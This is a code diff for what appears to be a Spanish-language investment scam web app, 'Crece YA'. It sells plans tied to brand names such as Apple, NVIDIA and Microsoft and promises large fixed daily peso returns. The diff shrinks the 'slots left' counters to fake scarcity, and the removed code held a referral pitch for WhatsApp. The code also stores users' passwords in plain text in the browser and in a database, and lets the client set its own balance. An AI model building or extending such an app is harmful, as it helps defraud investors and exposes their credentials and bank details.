+        supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
       }
+    } catch(err) {
+      console.warn("Supabase initialization bypassed:", err);
     }
 
-    // CATÁLOGO: 6 INICIALES Y 6 VIP CON ESCALA DE DÍAS EXTENDIDA
+    setTimeout(() => {
+      const splash = document.getElementById('splash-screen');
+      if (splash) {
+        splash.style.opacity = '0';
+        setTimeout(() => splash.remove(), 400);
+      }
+    }, 1200);
+
     const plans = [
-      { id: 'meli', name: 'MELI (Mercado Libre)', cat: 'inicial', cost: 2000, days: 2, daily: 2500, total: 7000, slotsTotal: 100, slotsLeft: 64, color: '#f59e0b', btnBg: 'bg-amber-400 hover:bg-amber-300 text-slate-950', border: 'border-amber-300', logo: './meli.png' },
-      { id: 'tiktok', name: 'TikTok (ByteDance)', cat: 'inicial', cost: 3500, days: 3, daily: 3000, total: 12500, slotsTotal: 100, slotsLeft: 58, color: '#06b6d4', btnBg: 'bg-cyan-500 hover:bg-cyan-400 text-white', border: 'border-cyan-300', logo: './tiktok.png' },
-      { id: 'apple', name: 'AAPL (Apple Inc.)', cat: 'inicial', cost: 5000, days: 5, daily: 3200, total: 21000, slotsTotal: 100, slotsLeft: 47, color: '#1e293b', btnBg: 'bg-slate-900 hover:bg-slate-800 text-white', border: 'border-slate-300', logo: './apple.png' },
-      { id: 'spotify', name: 'Spotify (Audio)', cat: 'inicial', cost: 8000, days: 7, daily: 4000, total: 36000, slotsTotal: 100, slotsLeft: 39, color: '#22c55e', btnBg: 'bg-green-500 hover:bg-green-400 text-white', border: 'border-green-300', logo: './spotify.png' },
-      { id: 'amazon', name: 'AMZN (Amazon)', cat: 'inicial', cost: 12000, days: 10, daily: 5300, total: 65000, slotsTotal: 100, slotsLeft: 31, color: '#ea580c', btnBg: 'bg-orange-500 hover:bg-orange-400 text-white', border: 'border-orange-300', logo: './amazon.png' },
-      { id: 'netflix', name: 'Netflix (Streaming)', cat: 'inicial', cost: 15000, days: 10, daily: 7000, total: 85000, slotsTotal: 100, slotsLeft: 22, color: '#e50914', btnBg: 'bg-red-600 hover:bg-red-500 text-white', border: 'border-red-300', logo: './netflix.png' },
+      { id: 'meli', name: 'MELI (Mercado Libre)', cat: 'inicial', cost: 2000, days: 2, daily: 2500, total: 7000, slotsTotal: 15, slotsLeft: 8, color: '#f59e0b', btnBg: 'bg-amber-400 hover:bg-amber-300 text-slate-950', border: 'border-amber-300', logo: './meli.png' },
+      { id: 'tiktok', name: 'TikTok (ByteDance)', cat: 'inicial', cost: 3500, days: 3, daily: 3000, total: 12500, slotsTotal: 12, slotsLeft: 7, color: '#06b6d4', btnBg: 'bg-cyan-500 hover:bg-cyan-400 text-white', border: 'border-cyan-300', logo: './tiktok.png' },
+      { id: 'apple', name: 'AAPL (Apple Inc.)', cat: 'inicial', cost: 5000, days: 5, daily: 3200, total: 21000, slotsTotal: 12, slotsLeft: 6, color: '#1e293b', btnBg: 'bg-slate-900 hover:bg-slate-800 text-white', border: 'border-slate-300', logo: './apple.png' },
+      { id: 'spotify', name: 'Spotify (Audio)', cat: 'inicial', cost: 8000, days: 7, daily: 4000, total: 36000, slotsTotal: 10, slotsLeft: 5, color: '#22c55e', btnBg: 'bg-green-500 hover:bg-green-400 text-white', border: 'border-green-300', logo: './spotify.png' },
+      { id: 'amazon', name: 'AMZN (Amazon)', cat: 'inicial', cost: 12000, days: 10, daily: 5300, total: 65000, slotsTotal: 10, slotsLeft: 5, color: '#ea580c', btnBg: 'bg-orange-500 hover:bg-orange-400 text-white', border: 'border-orange-300', logo: './amazon.png' },
+      { id: 'netflix', name: 'Netflix (Streaming)', cat: 'inicial', cost: 15000, days: 10, daily: 7000, total: 85000, slotsTotal: 10, slotsLeft: 4, color: '#e50914', btnBg: 'bg-red-600 hover:bg-red-500 text-white', border: 'border-red-300', logo: './netflix.png' },
       
-      { id: 'nvidia', name: 'NVDA (NVIDIA AI)', cat: 'pro', cost: 20000, days: 15, daily: 3000, total: 65000, slotsTotal: 50, slotsLeft: 28, color: '#16a34a', btnBg: 'bg-emerald-600 hover:bg-emerald-500 text-white', border: 'border-emerald-300', logo: './nvidia.png' },
-      { id: 'instagram', name: 'Instagram (Meta)', cat: 'pro', cost: 25000, days: 25, daily: 4560, total: 139000, slotsTotal: 50, slotsLeft: 21, color: '#e11d48', btnBg: 'bg-rose-600 hover:bg-rose-500 text-white', border: 'border-rose-300', logo: './instagram.png' },
-      { id: 'tesla', name: 'TSLA (Tesla Motors)', cat: 'pro', cost: 35000, days: 45, daily: 4667, total: 245000, slotsTotal: 50, slotsLeft: 17, color: '#dc2626', btnBg: 'bg-red-600 hover:bg-red-500 text-white', border: 'border-red-400', logo: './tesla.png' },
-      { id: 'youtube', name: 'YouTube (Google)', cat: 'pro', cost: 50000, days: 60, daily: 6000, total: 410000, slotsTotal: 50, slotsLeft: 12, color: '#ef4444', btnBg: 'bg-red-500 hover:bg-red-400 text-white', border: 'border-red-300', logo: './youtube.png' },
-      { id: 'google', name: 'GOOGL (Alphabet)', cat: 'pro', cost: 80000, days: 75, daily: 8667, total: 730000, slotsTotal: 50, slotsLeft: 8, color: '#2563eb', btnBg: 'bg-blue-600 hover:bg-blue-500 text-white', border: 'border-blue-300', logo: './google.png' },
-      { id: 'microsoft', name: 'MSFT (Microsoft)', cat: 'pro', cost: 200000, days: 100, daily: 24000, total: 2600000, slotsTotal: 50, slotsLeft: 5, color: '#0284c7', btnBg: 'bg-sky-600 hover:bg-sky-500 text-white', border: 'border-sky-300', logo: './microsoft.png' }
+      { id: 'nvidia', name: 'NVDA (NVIDIA AI)', cat: 'pro', cost: 20000, days: 3, daily: 15000, total: 65000, slotsTotal: 3, slotsLeft: 3, color: '#16a34a', btnBg: 'bg-emerald-600 hover:bg-emerald-500 text-white', border: 'border-emerald-300', logo: './nvidia.png' },
+      { id: 'instagram', name: 'Instagram (Meta)', cat: 'pro', cost: 25000, days: 12, daily: 9500, total: 139000, slotsTotal: 8, slotsLeft: 4, color: '#e11d48', btnBg: 'bg-rose-600 hover:bg-rose-500 text-white', border: 'border-rose-300', logo: './instagram.png' },
+      { id: 'tesla', name: 'TSLA (Tesla Motors)', cat: 'pro', cost: 35000, days: 15, daily: 14000, total: 245000, slotsTotal: 8, slotsLeft: 4, color: '#dc2626', btnBg: 'bg-red-600 hover:bg-red-500 text-white', border: 'border-red-400', logo: './tesla.png' },
+      { id: 'youtube', name: 'YouTube (Google)', cat: 'pro', cost: 50000, days: 20, daily: 18000, total: 410000, slotsTotal: 6, slotsLeft: 3, color: '#ef4444', btnBg: 'bg-red-500 hover:bg-red-400 text-white', border: 'border-red-300', logo: './youtube.png' },
+      { id: 'google', name: 'GOOGL (Alphabet)', cat: 'pro', cost: 80000, days: 25, daily: 26000, total: 730000, slotsTotal: 5, slotsLeft: 2, color: '#2563eb', btnBg: 'bg-blue-600 hover:bg-blue-500 text-white', border: 'border-blue-300', logo: './google.png' },
+      { id: 'microsoft', name: 'MSFT (Microsoft)', cat: 'pro', cost: 200000, days: 40, daily: 60000, total: 2600000, slotsTotal: 3, slotsLeft: 1, color: '#0284c7', btnBg: 'bg-sky-600 hover:bg-sky-500 text-white', border: 'border-sky-300', logo: './microsoft.png' }
     ];
 
     let appState = {
-      phone: '',
-      pass: '',
-      name: '',
-      cvu: '',
-      alias: '',
-      bankVerified: false,
-      balance: 0,
-      pending: 0,
-      withdrawn: 0,
-      lastClaim: 0,
-      lastWithdraw: 0,
-      lastWithdrawNet: 0,
-      darkMode: false,
-      activePlans: []
-    };
-
-    try {
-      appState.phone = localStorage.getItem('cy_phone') || '';
-      appState.pass = localStorage.getItem('cy_pass') || '';
-      appState.name = localStorage.getItem('cy_name') || '';
-      appState.cvu = localStorage.getItem('cy_cvu') || '';
-      appState.alias = localStorage.getItem('cy_alias') || '';
-      appState.bankVerified = localStorage.getItem('cy_bank_verified') === 'true';
-      appState.balance = parseFloat(localStorage.getItem('cy_bal')) || 0;
-      appState.pending = parseFloat(localStorage.getItem('cy_pending')) || 0;
-      appState.withdrawn = parseFloat(localStorage.getItem('cy_withdrawn')) || 0;
-      appState.lastClaim = parseInt(localStorage.getItem('cy_claim')) || 0;
-      appState.lastWithdraw = parseInt(localStorage.getItem('cy_last_withdraw')) || 0;
-      appState.lastWithdrawNet = parseFloat(localStorage.getItem('cy_last_withdraw_net')) || 0;
-      appState.darkMode = localStorage.getItem('cy_dark') === 'true';
-      appState.activePlans = JSON.parse(localStorage.getItem('cy_active_plans')) || [];
-    } catch(e) {}
-
-    if (referredByUrl) {
-      const refInput = document.getElementById('auth-ref-input');
-      if (refInput) {
-        refInput.value = referredByUrl;
-        refInput.readOnly = true;
-      }
-    }
-
-    ['prof-cvu-input', 'withdraw-dest-cvu'].forEach(id => {
-      const el = document.getElementById(id);
-      if (el) {
-        el.addEventListener('input', (e) => {
-          e.target.value = e.target.value.replace(/\D/g, '');
-        });
-      }
-    });
-
-    window.togglePassView = function(inputId, btn) {
-      const input = document.getElementById(inputId);
-      if (!input) return;
-      if (input.type === 'password') {
-        input.type = 'text';
-        btn.innerHTML = '<i class="fa-solid fa-eye-slash"></i>';
-      } else {
-        input.type = 'password';
-        btn.innerHTML = '<i class="fa-solid fa-eye"></i>';
-      }
-    };
-
-    let authMode = 'register';
-    window.setAuthMode = function(mode) {
-      authMode = mode;
-      const btnReg = document.getElementById('tab-auth-register');
-      const btnLog = document.getElementById('tab-auth-login');
-      const confirmBox = document.getElementById('auth-confirm-box');
-      const refBox = document.getElementById('auth-ref-box');
-      const captchaBox = document.getElementById('auth-captcha-box');
-      const submitBtn = document.getElementById('btn-submit-auth');
-
-      if (mode === 'login') {
-        btnLog.className = "py-2 rounded-lg bg-sky-500 text-slate-950 transition cursor-pointer";
-        btnReg.className = "py-2 rounded-lg text-slate-400 hover:text-white transition cursor-pointer";
-        confirmBox.classList.add('hidden');
-        if (refBox) refBox.classList.add('hidden');
-        captchaBox.classList.add('hidden');
-        submitBtn.innerText = "Iniciar Sesión";
-      } else {
-        btnReg.className = "py-2 rounded-lg bg-sky-500 text-slate-950 transition cursor-pointer";
-        btnLog.className = "py-2 rounded-lg text-slate-400 hover:text-white transition cursor-pointer";
-        confirmBox.classList.remove('hidden');
-        if (refBox) refBox.classList.remove('hidden');
-        captchaBox.classList.remove('hidden');
-        submitBtn.innerText = "Registrarse e Ingresar";
-      }
-    };
-
-    function applyTheme() {
-      const icon = document.getElementById('theme-icon');
-      if (appState.darkMode) {
-        document.body.classList.add('dark-mode');
-        if (icon) icon.className = "fa-solid fa-sun text-amber-300";
-      } else {
-        document.body.classList.remove('dark-mode');
-        if (icon) icon.className = "fa-solid fa-moon text-slate-700";
-      }
-    }
-
-    window.toggleTheme = function() {
-      appState.darkMode = !appState.darkMode;
-      try { localStorage.setItem('cy_dark', appState.darkMode); } catch(e) {}
-      applyTheme();
+      phone: localStorage.getItem('cy_phone') || '',
+      pass: localStorage.getItem('cy_pass') || '',
+      name: localStorage.getItem('cy_name') || '',
+      cvu: localStorage.getItem('cy_cvu') || '',
+      alias: localStorage.getItem('cy_alias') || '',
+      balance: parseFloat(localStorage.getItem('cy_bal')) || 0,
+      pending: parseFloat(localStorage.getItem('cy_pending')) || 0,
+      withdrawn: parseFloat(localStorage.getItem('cy_withdrawn')) || 0,
+      lastClaim: parseInt(localStorage.getItem('cy_claim')) || 0,
+      lastWithdraw: parseInt(localStorage.getItem('cy_last_withdraw')) || 0,
+      activePlans: JSON.parse(localStorage.getItem('cy_active_plans')) || [],
+      invites: JSON.parse(localStorage.getItem('cy_invites')) || [],
+      txs: JSON.parse(localStorage.getItem('cy_txs')) || []
     };
 
     function saveLocal() {
-      try {
-        localStorage.setItem('cy_phone', appState.phone);
-        localStorage.setItem('cy_pass', appState.pass);
-        localStorage.setItem('cy_name', appState.name);
-        localStorage.setItem('cy_cvu', appState.cvu);
-        localStorage.setItem('cy_alias', appState.alias);
-        localStorage.setItem('cy_bank_verified', appState.bankVerified);
-        localStorage.setItem('cy_bal', appState.balance);
-        localStorage.setItem('cy_pending', appState.pending);
-        localStorage.setItem('cy_withdrawn', appState.withdrawn);
-        localStorage.setItem('cy_claim', appState.lastClaim);
-        localStorage.setItem('cy_last_withdraw', appState.lastWithdraw);
-        localStorage.setItem('cy_last_withdraw_net', appState.lastWithdrawNet);
-        localStorage.setItem('cy_dark', appState.darkMode);
-        localStorage.setItem('cy_active_plans', JSON.stringify(appState.activePlans));
-      } catch(e) {}
+      localStorage.setItem('cy_phone', appState.phone);
+      localStorage.setItem('cy_pass', appState.pass);
+      localStorage.setItem('cy_name', appState.name);
+      localStorage.setItem('cy_cvu', appState.cvu);
+      localStorage.setItem('cy_alias', appState.alias);
+      localStorage.setItem('cy_bal', appState.balance);
+      localStorage.setItem('cy_pending', appState.pending);
+      localStorage.setItem('cy_withdrawn', appState.withdrawn);
+      localStorage.setItem('cy_claim', appState.lastClaim);
+      localStorage.setItem('cy_last_withdraw', appState.lastWithdraw);
+      localStorage.setItem('cy_active_plans', JSON.stringify(appState.activePlans));
+      localStorage.setItem('cy_invites', JSON.stringify(appState.invites));
+      localStorage.setItem('cy_txs', JSON.stringify(appState.txs));
       renderUI();
-      renderProducts();
     }
+
+    async function syncWithSupabase(fetchOnly = false) {
+      if (!appState.phone || !supabase) return;
+      try {
+        if (!fetchOnly) {
+          await supabase.from('usuarios').upsert({
+            phone: appState.phone,
+            pass: appState.pass,
+            name: appState.name,
+            cvu: appState.cvu,
+            alias: appState.alias,
+            balance: appState.balance,
+            pending: appState.pending,
+            withdrawn: appState.withdrawn,
+            last_claim: appState.lastClaim,
+            last_withdraw: appState.lastWithdraw,
+            active_plans: appState.activePlans
+          }, { onConflict: 'phone' });
+        } else {
+          const { data } = await supabase.from('usuarios').select('*').eq('phone', appState.phone).single();
+          if (data) {
+            appState.name = data.name || appState.name;
+            appState.cvu = data.cvu || appState.cvu;
+            appState.alias = data.alias || appState.alias;
+            appState.balance = parseFloat(data.balance) || appState.balance;
+            appState.pending = parseFloat(data.pending) || appState.pending;
+            appState.withdrawn = parseFloat(data.withdrawn) || appState.withdrawn;
+            appState.lastClaim = parseInt(data.last_claim) || appState.lastClaim;
+            appState.lastWithdraw = parseInt(data.last_withdraw) || appState.lastWithdraw;
+            if (data.active_plans && Array.isArray(data.active_plans)) {
+              appState.activePlans = data.active_plans;
+            }
+          }
+        }
+      } catch(e) {
+        console.warn("Supabase sync issue:", e);
+      }
+      renderUI();
+    }
+
+    // Intervalo de sincronización con el servidor reducido a 60 segundos para evitar saturación de logs
+    setInterval(() => {
+      if (appState.phone) syncWithSupabase(true);
+    }, 60000);
 
     function fmt(n) {
       return new Intl.NumberFormat('es-AR').format(Math.round(n));
+    }
+
+    let authMode = 'login';
+    function setAuthMode(mode) {
+      authMode = mode;
+      const btnLog = document.getElementById('auth-tab-btn-login');
+      const btnReg = document.getElementById('auth-tab-btn-reg');
+      const regBox = document.getElementById('auth-reg-extra');
+      const btnSubmit = document.getElementById('btn-auth-submit');
+
+      if (mode === 'login') {
+        btnLog.className = "py-1.5 rounded-lg bg-sky-500 text-slate-950 transition";
+        btnReg.className = "py-1.5 rounded-lg text-slate-400 hover:text-white transition";
+        regBox.classList.add('hidden');
+        btnSubmit.innerText = "Iniciar Sesión";
+      } else {
+        btnReg.className = "py-1.5 rounded-lg bg-sky-500 text-slate-950 transition";
+        btnLog.className = "py-1.5 rounded-lg text-slate-400 hover:text-white transition";
+        regBox.classList.remove('hidden');
+        btnSubmit.innerText = "Crear Cuenta";
+        generateCaptcha();
+      }
     }
 
     let currentCaptcha = '4821';
@@ -856,358 +641,122 @@
       if (el) el.innerText = currentCaptcha;
     }
 
-    window.closeNoticeModal = function() {
-      document.getElementById('notice-modal').classList.add('hidden');
-    };
-
-    function updateReferralLink() {
-      const userRefCode = appState.phone ? appState.phone.replace(/[^0-9]/g, '') : '11482019';
-      const myPersonalRefUrl = `${window.location.origin}${window.location.pathname}?ref=${userRefCode}`;
-      
-      const inputEl = document.getElementById('ref-link-input');
-      if (inputEl) inputEl.value = myPersonalRefUrl;
-
-      const btnCopy = document.getElementById('btn-copy-ref');
-      if (btnCopy) {
-        btnCopy.onclick = () => {
-          navigator.clipboard.writeText(myPersonalRefUrl).then(() => {
-            btnCopy.innerText = "¡Copiado!";
-            setTimeout(() => { btnCopy.innerText = "Copiar"; }, 1500);
-          });
-        };
-      }
-
-      const btnWs = document.getElementById('btn-share-whatsapp');
-      if (btnWs) {
-        btnWs.onclick = () => {
-          const msg = encodeURIComponent(`¿Alguna vez pensaste en ser dueño de las plataformas que usás todos los días? 📱 Ahora podés con Crece YA: desde solo $2.000 ARS adquirís fracciones de Mercado Libre, TikTok, Apple o Spotify con rendimientos diarios directos en pesos ⚡ Registrate desde mi enlace asegurado y empezá hoy: ${myPersonalRefUrl}`);
-          window.open(`https://api.whatsapp.com/send?text=${msg}`, '_blank');
-        };
-      }
-
-      cargarInvitadosEnVivo();
-    }
-
-    async function cargarInvitadosEnVivo() {
-      const container = document.getElementById('invites-list-container');
-      const badge = document.getElementById('invites-count-badge');
-      if (!container || !appState.phone) return;
-
-      const rawPhone = appState.phone.trim();
-      const digitsPhone = rawPhone.replace(/\D/g, '');
-      const last8 = digitsPhone.length >= 8 ? digitsPhone.slice(-8) : digitsPhone;
-
-      let invitados = [];
-      try {
-        const queryFilter = `or=(invited_by.eq.${encodeURIComponent(rawPhone)},invited_by.eq.${encodeURIComponent(digitsPhone)},invited_by.ilike.*${encodeURIComponent(last8)})`;
-        const res = await supabaseRequest(`usuarios?${queryFilter}&select=phone,name,balance,created_at,invited_by,has_deposited`);
-        
-        if (Array.isArray(res)) {
-          invitados = res;
-        } else if (res && Array.isArray(res.data)) {
-          invitados = res.data;
-        }
-
-        if (invitados.length === 0) {
-          const fallback = await supabaseRequest('usuarios?select=phone,name,balance,created_at,invited_by,has_deposited');
-          const allList = Array.isArray(fallback) ? fallback : (fallback && fallback.data ? fallback.data : []);
-          if (Array.isArray(allList)) {
-            invitados = allList.filter(u => {
-              if (!u.invited_by) return false;
-              const refRaw = String(u.invited_by).trim();
-              const refClean = refRaw.replace(/\D/g, '');
-              return refClean === digitsPhone || refRaw === rawPhone || (last8.length >= 6 && refClean.includes(last8));
-            });
-          }
-        }
-      } catch(e) {
-        console.warn("Error cargando invitados:", e);
-      }
-
-      invitados = invitados.filter(inv => (inv.phone || '').replace(/\D/g, '') !== digitsPhone);
-
-      if (badge) badge.innerText = `${invitados.length} en tu red`;
-
-      if (invitados.length === 0) {
-        container.innerHTML = '<p class="text-slate-400 text-center py-3 text-sub">Aún no tienes personas registradas con tu enlace.</p>';
-        return;
-      }
-
-      container.innerHTML = invitados.map(inv => {
-        const ph = inv.phone || '';
-        const maskedPhone = ph.length > 7 ? ph.substring(0, 6) + '***' + ph.substring(ph.length - 2) : ph;
-        const depositDone = inv.has_deposited === true || parseFloat(inv.balance || 0) >= 2000;
-        const statusBadge = depositDone 
-          ? '<span class="text-[10px] font-mono text-emerald-700 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded font-bold">Oficial ✓</span>' 
-          : '<span class="text-[10px] font-mono text-amber-700 bg-amber-50 border border-amber-200 px-2 py-0.5 rounded font-bold">Esperando validación</span>';
-
-        return `
-          <div class="subbox-theme flex justify-between items-center p-2 rounded-xl bg-slate-50 border border-slate-100">
-            <div>
-              <span class="font-bold text-slate-800 text-xs block text-main">${inv.name || 'Usuario Crece YA'}</span>
-              <span class="text-[10px] text-slate-400 font-mono text-sub">${maskedPhone}</span>
-            </div>
-            ${statusBadge}
-          </div>
-        `;
-      }).join('');
-    }
-
-    // SINCRONIZACIÓN CORREGIDA Y ACTIVA
-    async function sincronizarSaldoServidor() {
-      if (!appState.phone) return;
-      
-      const cleanPhone = appState.phone.trim();
-      let data = await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(cleanPhone)}&select=*`);
-      
-      if (!data || data.length === 0) {
-        const rawDigits = cleanPhone.replace(/\D/g, '');
-        data = await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(rawDigits)}&select=*`);
-      }
-
-      if (data && data.length > 0) {
-        const dbUser = data[0];
-        const nuevoBalance = parseFloat(dbUser.balance);
-        if (!isNaN(nuevoBalance)) {
-          appState.balance = nuevoBalance;
-        }
-        if (dbUser.pass) appState.pass = dbUser.pass;
-        if (dbUser.name) appState.name = dbUser.name;
-        if (dbUser.cvu) appState.cvu = dbUser.cvu;
-        if (dbUser.alias) appState.alias = dbUser.alias;
-        if (dbUser.withdrawn !== undefined) appState.withdrawn = parseFloat(dbUser.withdrawn) || 0;
-        if (dbUser.last_claim !== undefined) appState.lastClaim = parseInt(dbUser.last_claim) || 0;
-        if (dbUser.bank_verified !== undefined) {
-          appState.bankVerified = dbUser.bank_verified === true;
-        }
-        
-        // Si en Supabase last_withdraw está en 0, limpiar bloqueo en el móvil
-        if (dbUser.last_withdraw !== undefined && parseInt(dbUser.last_withdraw) === 0) {
-          appState.lastWithdraw = 0;
-          appState.lastWithdrawNet = 0;
-        }
-
-        if (dbUser.active_plans && Array.isArray(dbUser.active_plans)) {
-          appState.activePlans = dbUser.active_plans;
-        }
-
-        saveLocal();
-        renderUI();
-      }
-    }
-
     async function checkAuth() {
-      const authScreen = document.getElementById('auth-screen');
       if (appState.phone && appState.pass) {
-        if (authScreen) authScreen.remove();
+        document.getElementById('auth-screen').classList.add('hidden');
         document.getElementById('user-display-phone').innerText = appState.phone;
-        updateReferralLink();
-        await sincronizarSaldoServidor();
         renderUI();
-        renderProducts();
-        document.getElementById('notice-modal').classList.remove('hidden');
+        await syncWithSupabase(true);
       } else {
-        generateCaptcha();
-        if (authScreen) authScreen.style.display = 'flex';
+        setAuthMode('login');
+        document.getElementById('auth-screen').classList.remove('hidden');
       }
     }
 
-    setInterval(sincronizarSaldoServidor, 4000);
+    document.getElementById('auth-form').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const phone = document.getElementById('auth-phone').value.trim();
+      const pass = document.getElementById('auth-pass').value;
 
-    window.handleAuthSubmit = async function() {
-      const phoneInput = document.getElementById('auth-phone');
-      const passInput = document.getElementById('auth-pass');
-      const passConfInput = document.getElementById('auth-pass-confirm');
-      const refInput = document.getElementById('auth-ref-input');
-      const captchaInput = document.getElementById('auth-captcha-input');
-      const submitBtn = document.getElementById('btn-submit-auth');
-
-      const phone = phoneInput ? phoneInput.value.trim() : '';
-      const pass = passInput ? passInput.value : '';
-
-      if (!phone) {
-        alert("Por favor ingresa tu número de teléfono.");
-        return;
-      }
-      if (!pass) {
-        alert("Por favor ingresa tu contraseña.");
-        return;
-      }
-
-      submitBtn.disabled = true;
-      const originalText = submitBtn.innerText;
-      submitBtn.innerText = "Procesando...";
-
-      if (authMode === 'register') {
-        const passConf = passConfInput ? passConfInput.value : '';
-        const capVal = captchaInput ? captchaInput.value.trim() : '';
-
-        const typedRef = refInput ? refInput.value.trim() : '';
-        const finalInvitedBy = typedRef || referredByUrl || null;
-
+      if (authMode === 'reg') {
+        const passConf = document.getElementById('auth-pass-confirm').value;
+        const captchaInput = document.getElementById('auth-captcha-input').value.trim();
         if (pass !== passConf) {
           alert("Las contraseñas no coinciden.");
-          submitBtn.disabled = false;
-          submitBtn.innerText = originalText;
           return;
         }
-        if (capVal !== currentCaptcha) {
-          alert("Código de seguridad incorrecto.");
-          submitBtn.disabled = false;
-          submitBtn.innerText = originalText;
+        if (captchaInput !== currentCaptcha) {
+          alert("El código de seguridad es incorrecto.");
+          generateCaptcha();
           return;
-        }
-
-        await supabaseRequest('usuarios', 'POST', {
-          phone: phone,
-          pass: pass,
-          name: '',
-          cvu: '',
-          alias: '',
-          balance: 0,
-          invited_by: finalInvitedBy,
-          bank_verified: false,
-          active_plans: []
-        });
-      } else {
-        let dbUsers = await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(phone)}&select=*`);
-        if (!dbUsers || dbUsers.length === 0) {
-          const rawDigits = phone.replace(/\D/g, '');
-          dbUsers = await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(rawDigits)}&select=*`);
-        }
-
-        if (dbUsers && dbUsers.length > 0) {
-          if (dbUsers[0].pass !== pass) {
-            alert("Contraseña incorrecta.");
-            submitBtn.disabled = false;
-            submitBtn.innerText = originalText;
-            return;
-          }
-          appState.balance = parseFloat(dbUsers[0].balance) || 0;
-          appState.name = dbUsers[0].name || '';
-          appState.cvu = dbUsers[0].cvu || '';
-          appState.alias = dbUsers[0].alias || '';
-          appState.withdrawn = parseFloat(dbUsers[0].withdrawn) || 0;
-          appState.bankVerified = dbUsers[0].bank_verified === true;
-          appState.lastClaim = parseInt(dbUsers[0].last_claim) || 0;
-
-          if (dbUsers[0].last_withdraw !== undefined && parseInt(dbUsers[0].last_withdraw) === 0) {
-            appState.lastWithdraw = 0;
-            appState.lastWithdrawNet = 0;
-          }
-
-          if (dbUsers[0].active_plans && Array.isArray(dbUsers[0].active_plans)) {
-            appState.activePlans = dbUsers[0].active_plans;
-          }
         }
       }
 
       appState.phone = phone;
       appState.pass = pass;
       saveLocal();
-
-      const authScreen = document.getElementById('auth-screen');
-      if (authScreen) authScreen.remove();
-      document.getElementById('user-display-phone').innerText = appState.phone;
-      updateReferralLink();
-      await sincronizarSaldoServidor();
-      renderUI();
-      renderProducts();
-
-      document.getElementById('notice-modal').classList.remove('hidden');
-    };
+      checkAuth();
+      await syncWithSupabase(false);
+    });
 
     document.getElementById('btn-logout').addEventListener('click', () => {
       if (confirm("¿Cerrar sesión en este dispositivo?")) {
-        try { localStorage.clear(); } catch(e) {}
+        localStorage.clear();
         location.reload();
       }
     });
 
     let currentCategory = 'inicial';
-    window.switchTab = async function(tabName) {
+    window.switchTab = function(tabName) {
       const tabs = ['planes', 'productos', 'compartir', 'perfil'];
       tabs.forEach(t => {
         document.getElementById(`view-${t}`).classList.add('hidden');
-        document.getElementById(`nav-btn-${t}`).className = "nav-btn-inactive bg-sky-50 text-sky-800 hover:bg-sky-100 py-2 rounded-xl font-semibold flex flex-col items-center gap-0.5 transition cursor-pointer";
+        document.getElementById(`nav-btn-${t}`).className = "bg-sky-50 text-sky-800 hover:bg-sky-100 py-1.5 rounded-xl font-semibold flex flex-col items-center gap-0.5 transition";
       });
       document.getElementById(`view-${tabName}`).classList.remove('hidden');
-      document.getElementById(`nav-btn-${tabName}`).className = "bg-sky-600 text-white py-2 rounded-xl font-bold flex flex-col items-center gap-0.5 shadow-sm transition cursor-pointer";
-      
-      if (tabName === 'compartir') updateReferralLink();
+      document.getElementById(`nav-btn-${tabName}`).className = "bg-sky-600 text-white py-1.5 rounded-xl font-bold flex flex-col items-center gap-0.5 shadow-sm transition";
       if (tabName === 'productos') renderProducts();
-      await sincronizarSaldoServidor();
     };
 
     document.getElementById('btn-tab-iniciales').addEventListener('click', () => {
       currentCategory = 'inicial';
-      document.getElementById('btn-tab-iniciales').className = "px-3 py-1 rounded-lg font-bold bg-sky-600 text-white transition cursor-pointer";
-      document.getElementById('btn-tab-pro').className = "px-3 py-1 rounded-lg font-semibold text-slate-600 hover:text-slate-900 transition cursor-pointer";
+      document.getElementById('btn-tab-iniciales').className = "px-2.5 py-1 rounded-lg font-bold bg-sky-600 text-white transition";
+      document.getElementById('btn-tab-pro').className = "px-2.5 py-1 rounded-lg font-semibold text-slate-600 hover:text-slate-900 transition";
       renderPlans();
     });
 
     document.getElementById('btn-tab-pro').addEventListener('click', () => {
       currentCategory = 'pro';
-      document.getElementById('btn-tab-pro').className = "px-3 py-1 rounded-lg font-bold bg-sky-600 text-white transition cursor-pointer";
-      document.getElementById('btn-tab-iniciales').className = "px-3 py-1 rounded-lg font-semibold text-slate-600 hover:text-slate-900 transition cursor-pointer";
+      document.getElementById('btn-tab-pro').className = "px-2.5 py-1 rounded-lg font-bold bg-sky-600 text-white transition";
+      document.getElementById('btn-tab-iniciales').className = "px-2.5 py-1 rounded-lg font-semibold text-slate-600 hover:text-slate-900 transition";
       renderPlans();
     });
 
     function renderPlans() {
       const container = document.getElementById('plans-container');
+      if (!container) return;
       container.innerHTML = '';
 
       const filtered = plans.filter(p => p.cat === currentCategory);
       filtered.forEach(p => {
-        const yaAdquirido = appState.activePlans && appState.activePlans.some(plan => 
-          (plan.plan_code === p.id || plan.id === p.id || plan.name === p.name) && !plan.completed && (plan.endTime > Date.now())
-        );
-
         const canActivate = appState.balance >= p.cost;
-        let btnLabel = canActivate ? `Activar Plan: $${fmt(p.cost)}` : `Adquirir Plan: $${fmt(p.cost)}`;
-        let btnStyle = p.btnBg;
-
-        if (yaAdquirido) {
-          btnLabel = "Contrato en Curso ✓";
-          btnStyle = "bg-slate-700 text-slate-400 cursor-not-allowed";
-        }
-
+        const btnLabel = canActivate ? `Activar Plan: $${fmt(p.cost)}` : `Adquirir Plan: $${fmt(p.cost)}`;
         const card = document.createElement('div');
-        card.className = `card-theme p-4 rounded-2xl bg-white border ${p.border} shadow-xs hover:border-sky-400 transition space-y-2.5`;
+        card.className = `p-3.5 rounded-2xl bg-white border ${p.border} shadow-xs hover:border-sky-400 transition space-y-2`;
         
         card.innerHTML = `
           <div class="flex justify-between items-center">
             <div class="flex items-center gap-2.5">
-              <div class="subbox-theme w-9 h-9 rounded-xl bg-slate-50 border border-slate-200 p-1 flex items-center justify-center shrink-0 shadow-xs">
-                <img src="${p.logo}" alt="${p.name}" class="w-full h-full object-contain">
+              <div class="w-8 h-8 rounded-xl bg-slate-50 border border-slate-200 p-1 flex items-center justify-center shrink-0 shadow-xs">
+                <img src="${p.logo}" onerror="this.src='https://cdn-icons-png.flaticon.com/512/2152/2152539.png'" alt="${p.name}" class="w-full h-full object-contain">
               </div>
               <div>
